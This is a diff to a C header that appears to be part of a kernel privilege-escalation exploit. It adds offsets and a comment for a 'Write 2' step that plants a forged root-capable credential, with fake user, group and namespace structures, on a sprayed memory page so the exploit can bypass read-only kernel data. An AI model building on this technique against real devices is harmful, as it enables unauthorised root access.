@@ -199,8 +199,15 @@
 #define CFG_BIN_BUFFER_SIZE_OFF 96
 #define CFG_CB_MAX_SIZE_OFF     100
 
-/* Write 2 specific */
-#define CRED_COPY_OFF 0x1080
+/* Write 2 specific: fake credential + supporting structs on the spray page.
+ * The cred copy at CRED_COPY_OFF holds a root-capable cred whose user,
+ * user_ns and group_info pointers reference writable spray-page stubs
+ * instead of kernel .data symbols (which live on RO pages on this SoC). */
+#define CRED_COPY_OFF    0x1080
+#define FAKE_USER_OFF    0x1C00
+#define FAKE_GROUPS_OFF  0x1C80
+#define FAKE_USERNS_OFF  0x1D00
+#define FAKE_SEBLOB_OFF  0x1E00
 
 #endif
 
